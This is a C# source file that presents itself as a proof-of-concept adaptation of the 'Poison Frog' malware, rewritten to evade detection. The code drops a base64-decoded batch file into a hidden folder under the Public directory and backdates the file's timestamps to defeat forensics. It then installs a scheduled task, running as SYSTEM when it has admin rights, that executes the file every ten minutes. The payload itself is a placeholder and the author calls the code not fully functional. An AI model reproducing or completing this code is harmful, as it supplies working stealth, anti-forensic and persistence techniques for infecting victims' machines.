/*
  POC Adaptation of Poison Frog Malware written in C Sharp
  By: Thomas Peterson

  Improvements:
  1. Written in C Sharp to reduce detection.
  2. Uses a batch file to compile and execute the payload. 
  3. Not fully functional yet

*/

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace AIDS
{
    public static class Globals
    {   
        public static string batPath = @"C:\Users\Public\Public\update.bat";
        public static string dirPath = @"C:\Users\Public\Public";   
    }

    class PFrog
    {
        public void ResetFiles()
        {
            if (Directory.Exists(Globals.dirPath))
            {
                if (File.Exists(Globals.batPath))
                {
                    File.Delete(Globals.batPath);
                }
                Directory.Delete(Globals.dirPath);
            }
            if (!Directory.Exists(Globals.dirPath))
            {
                DirectoryInfo dir = new DirectoryInfo(Globals.dirPath);
                dir.Create();
                dir.Attributes |= FileAttributes.Hidden;  
            }
        }

        public void DecodeCopy()
        {
            string base64Encoded = "YmFzZTY0IGVuY29kZWQgc3RyaW5n";

            if (Directory.Exists(Globals.dirPath))
            {
                byte[] filebytes = Convert.FromBase64String(base64Encoded);
                FileStream decode = new FileStream(Globals.batPath,
                                               FileMode.CreateNew,
                                               FileAccess.ReadWrite,
                                               FileShare.None);
                decode.Write(filebytes, 0, filebytes.Length);
                decode.Close();
            }
                Random getRand = new Random();
                int range = 3 * 365;
                DateTime randDate = DateTime.Today.AddDays(-getRand.Next(range));
            try
            {
                File.SetAttributes(Globals.batPath, FileAttributes.Hidden);
                File.SetCreationTime(Globals.batPath, randDate);
                Directory.SetCreationTime(Globals.dirPath, randDate);
                File.SetLastWriteTime(Globals.batPath, DateTime.Now.AddDays(-43));
                File.SetLastAccessTime(Globals.batPath, DateTime.Now.AddDays(-18));
                Directory.SetLastWriteTime(Globals.dirPath, DateTime.Now.AddDays(-43));
                Directory.SetLastAccessTime(Globals.dirPath, DateTime.Now.AddDays(-18));
            } 
            catch (Exception)
            {
                return;
            } 
        }
        
        public void CreateTask()
        {
            
            string command0 = @" /CREATE /F /RU SYSTEM /SC  MINUTE /MO 10 /TN \UpdateTasks\UpdateTask /TR ""C:\Windows\Sysstem32\cmd.exe %PUBLIC%\Public\update.bat""";
            string command1 = @" /CREATE /F /SC  MINUTE /MO 10 /TN \UpdateTasks\UpdateTask /TR ""C:\Windows\Sysstem32\cmd.exe %PUBLIC%\Public\update.bat""";

            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    using (Process adminAcc = new Process())
                    {
                        adminAcc.StartInfo.FileName = "SCHTASKS";
                        adminAcc.StartInfo.Arguments = command0;
                        adminAcc.StartInfo.CreateNoWindow = true;
                        adminAcc.StartInfo.UseShellExecute = true;
                        adminAcc.Start();
                        adminAcc.WaitForExit();
                        adminAcc.Close();
                    }
                }
                else
                {
                    using (Process userAcc = new Process())
                    {
                        userAcc.StartInfo.FileName = "SCHTASKS";
                        userAcc.StartInfo.Arguments = command1;
                        userAcc.StartInfo.CreateNoWindow = true;
                        userAcc.StartInfo.UseShellExecute = true;
                        userAcc.Start();
                        userAcc.WaitForExit();
                        userAcc.Close();
                    }
                }
            }
        }
      
        static void Main(string[] args)
        {
            try
            {
                PFrog F = new PFrog();
                F.ResetFiles();
                F.DecodeCopy();
                F.CreateTask();    
            }
            catch (Exception)
            {
                return;
            }    
        }
    }
}

